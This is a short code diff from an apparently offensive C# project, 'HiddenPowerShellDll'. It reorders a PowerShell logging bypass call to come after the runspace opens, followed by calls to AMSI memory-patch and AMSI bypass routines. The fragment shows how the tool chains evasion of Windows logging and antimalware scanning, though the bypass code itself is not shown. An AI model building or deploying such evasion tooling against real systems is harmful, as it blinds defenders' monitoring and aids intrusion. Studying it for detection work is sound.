@@ -47,9 +47,9 @@ namespace HiddenPowerShellDll
 
             RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
             Runspace rspace = RunspaceFactory.CreateRunspace(rspacecfg);
-            HiddenPowerShellDllLoggingEV.runBypass(rspace.GetType().Assembly);
-            
             rspace.Open();
+
+            HiddenPowerShellDllLoggingEV.runBypass(rspace.GetType().Assembly);
             if(HiddePowerShellDllAmsiMemPatch.runBypass() == 1)
             {
                 if(HiddenPowerShellDllAmsiEV.runBypass(rspace.GetType().Assembly) == 1)
